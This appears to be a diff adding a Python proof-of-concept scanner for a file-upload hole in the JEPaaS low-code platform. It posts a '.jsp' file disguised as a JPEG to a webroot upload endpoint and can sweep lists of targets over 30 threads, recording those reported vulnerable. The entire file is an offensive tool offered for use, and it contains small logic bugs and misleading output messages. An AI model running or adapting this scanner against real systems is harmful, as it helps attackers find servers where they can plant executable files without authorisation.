@@ -1,0 +1,57 @@
+import requests,argparse,sys,json
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+def banner():
+    ico = """
+
+
+     ██╗███████╗██████╗  █████╗  █████╗ ███████╗      ██╗      ██████╗ ██╗    ██╗       ██████╗ ██████╗ ██████╗ ███████╗
+     ██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝      ██║     ██╔═══██╗██║    ██║      ██╔════╝██╔═══██╗██╔══██╗██╔════╝
+     ██║█████╗  ██████╔╝███████║███████║███████╗█████╗██║     ██║   ██║██║ █╗ ██║█████╗██║     ██║   ██║██║  ██║█████╗  
+██   ██║██╔══╝  ██╔═══╝ ██╔══██║██╔══██║╚════██║╚════╝██║     ██║   ██║██║███╗██║╚════╝██║     ██║   ██║██║  ██║██╔══╝  
+╚█████╔╝███████╗██║     ██║  ██║██║  ██║███████║      ███████╗╚██████╔╝╚███╔███╔╝      ╚██████╗╚██████╔╝██████╔╝███████╗
+ ╚════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝      ╚══════╝ ╚═════╝  ╚══╝╚══╝        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝
+                                                                                                                        
+                                                             autho：zm
+"""
+    print(ico)
+
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description="This is JEPaaS Low Code Platform Document File Upload Vulnerability")
+    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
+    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
+    args = parser.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    if args.file and not args.url:
+        url_list = []
+        with open(args.file,'r',encoding='utf-8') as fp:
+            for url in fp.readlines():
+                url_list.append(url.strip())
+        mp = Pool(30)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python {sys.argv[0]} -h")
+
+def poc(target):
+    api='/je/document/file?bucket=webroot'
+    files = {
+    'files': ('111.jsp', b'123', 'image/jpeg')
+}
+    try:
+        res=requests.get(url=target+api,files=files,verify=False,timeout=6)    
+        json_data = res.json()
+        if json_data.get('code') == 1000:
+            print(f"[+]{target} have loophole “{target+api}”")
+            with open ('result.txt','a',encoding='utf-8') as f:
+                f.write(target+'\n')
+        else:
+            print(f"[-]{target} have loophole")
+    except:
+            pass
+
+if __name__ == "__main__":
+    main()
